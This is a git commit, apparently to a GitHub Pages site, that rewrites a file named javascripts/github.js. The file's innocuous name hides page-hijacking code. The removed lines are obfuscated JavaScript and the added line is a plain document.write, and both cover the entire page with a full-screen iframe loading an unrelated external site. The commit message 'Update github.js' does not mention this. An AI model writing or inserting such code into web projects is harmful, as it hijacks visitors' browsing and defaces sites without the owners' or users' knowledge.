d361ea5a586add1e0e7803f479058cefbc9285b4
haiwaiseo <haiwaiseo@gmail.com>
2016-06-24 09:57:02 +0800

    Update github.js

--- javascripts/github.js
+++ javascripts/github.js
@@ -1,14 +1,1 @@
-var _$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"http://www.hubotong001.com\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "relative", "body", "insertBefore", "firstChild","z-index","9999999999"];
-   window[_$[0]][_$[1]](_$[2]);
-     function a() {
-                     var b = window[_$[0]][_$[3]](_$[4]); 
-                     var c = _$[5];
-                     b[_$[6]] = c;
-                     b[_$[7]][_$[8]] = _$[9];
-                     b[_$[7]][_$[10]] = _$[9];
-                     b[_$[7]][_$[12]] = _$[13];
-                     b[_$[7]][_$[17]] = _$[18];
-                     var d = window[_$[0]][_$[14]];
-                     d[_$[15]](b, d[_$[16]]);document.write(d[_$[15]]);document.write(b);document.write(d[_$[16]]);
-                     };
-                     a();   
+ document.write('<div style="overflow:hidden"><div style="Z-INDEX:100086;POSITION:absolute;BACKGROUND-COLOR:#ffffff;WIDTH:100%;HEIGHT:100%;TOP:0px; RIGHT:0px;LEFT:0px;">'+"<iframe frameborder=\"0px\"src=\"http://www.hubotong001.com\" style=\" overflow-x: hidden;overflow-y:auto; padding-right:10px;height: 100%;width: 102%;position: fixed;\"></iframe>"+'</div>'+'</div>');
